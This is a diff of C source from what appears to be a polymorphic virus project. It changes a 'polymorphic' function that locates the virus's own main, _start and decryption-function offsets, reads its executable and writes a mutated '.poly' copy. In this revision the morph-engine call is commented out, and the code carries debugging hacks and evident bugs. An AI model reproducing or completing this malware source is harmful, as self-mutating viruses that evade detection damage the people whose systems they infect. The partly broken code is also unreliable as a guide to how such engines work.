@@ -66,57 +66,75 @@ char* getaddress(char *filename, char*symbol){
 	}
 }
 
-int polymorphic(int argc, char* argv[])
+int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
 {
-      int i;
-      for (i=0; i<argc; ++i) {
-      printf("polymorphic argv[%d]=%s\n", i, argv[i]);
-      }
+      // // int i;
+      // // for (i=0; i<argc; ++i) {
+      // // printf("polymorphic argv[%d]=%s\n", i, argv[i]);
+      // // }
 
-
-      char main[]="main";
-      char start[]="_start";
-      char decryption[]="decrypt.decryption_function";
-      
-	// now create logic to decrypt the whole chunk of file first, because the morphed virus will be encrypted so cant find symobls
-	char nogo[]="./virus.poly";
-	if(strcmp(nogo,argv[0])==0){
-		printf("hello");
-		return 0;
-	}
-
-      // write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
-      // printf("\n");
-      // write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
-      // printf("\n");
-      // write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
-      // printf("\n");
-
-	// // to get offset just delete the most significant char
-
-      char *main_offset = getaddress(argv[0], "main") + 1;
-      char *start_offset = getaddress(argv[0], "_start") + 1;
-      char *decryption_offset = getaddress(argv[0], "decrypt.decryption_function") + 1;
-
-      // write(1, main_offset, strlen(main_offset));
-
-      const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
-	size_t virus_encrypt_size    = (int)strtol(start_offset, NULL, 16);
-      
-      // calculate the payload size
-      virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;
-
-	const size_t virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
+	// // virus name
+	char filename[] = "virus";
 
       printf("%ul\n", virus_instruction_begin);
       printf("%ul\n", virus_encrypt_size);
       printf("%ul\n", virus_decrypt_offset);
 
+      // char main[]="main";
+      // char start[]="_start";
+      // char decryption[]="decrypt.decryption_function";
+      
+	// now create logic to decrypt the whole chunk of file first, because the morphed virus will be encrypted so cant find symobls
+	char nogo[]="./virus.poly";
+	if(strcmp(nogo,filename)==0){
+		printf("hello");
+		return 0;
+	}
+
+      // write(1, getaddress(filename, main), strlen(getaddress(filename, main)));
+      // printf("\n");
+      // write(1, getaddress(filename, start), strlen(getaddress(filename, start)));
+      // printf("\n");
+      // write(1, getaddress(filename, decryption), strlen(getaddress(filename, decryption)));
+      // printf("\n");
+
+	// to get offset just delete the most significant char
+	char buffer1[15];
+	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
+	char *main_offset = buffer1;
+	write(1, main_offset, strlen(main_offset));
+	main_offset = main_offset + 1;
+	write(1, main_offset, strlen(main_offset));
+	printf("\n");
+
+	char buffer3[15];
+	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
+	char *decryption_offset = buffer3;
+	decryption_offset = decryption_offset + 1;
+	write(1, decryption_offset, strlen(decryption_offset));
+
+	printf("\n");
+
+      // char *main_offset = sprintf(buffer, "%06lx", (unsigned long)virus_instruction_begin);
+	// main_offset = main_offset + 1;
+      // char *start_offset = sprintf(buffer, "%06lx", (unsigned long)virus_encrypt_size);
+	// start_offset = start_offset + 1;
+      // char *decryption_offset = sprintf(buffer, "%06lx", (unsigned long)virus_decrypt_offset);
+	// decryption_offset = decryption_offset + 1;
+
+      // write(1, main_offset, strlen(main_offset));
+
+      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
+	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
+
+      printf("%ul\n", virus_instruction_begin);
+      printf("%ul\n", virus_decrypt_offset);
+
       // open the executable file
-	FILE* exe_file = fopen(argv[0], "rb");
+	FILE* exe_file = fopen(filename, "rb");
 	if(!exe_file)
 	{
-		printf("Failed to open %s\n", argv[0]);
+		printf("Failed to open %s\n", filename);
 		return -1;
 	}
 
@@ -147,16 +165,16 @@ int polymorphic(int argc, char* argv[])
 
 
 
-	// call the polymorphic engine
-	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
-	{
-		printf("An error occured in the polymorphic engine\n");
+	// // call the polymorphic engine
+	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	// {
+	// 	printf("An error occured in the polymorphic engine\n");
 
-	}
+	// }
 
 	// initialize the output filename
 	char out_filename[FILENAME_MAX];
-	snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
+	snprintf(out_filename, FILENAME_MAX, "%s.poly", filename);
       printf("/n");
 	// open the output file
 	FILE* out_file = fopen(out_filename, "wb");
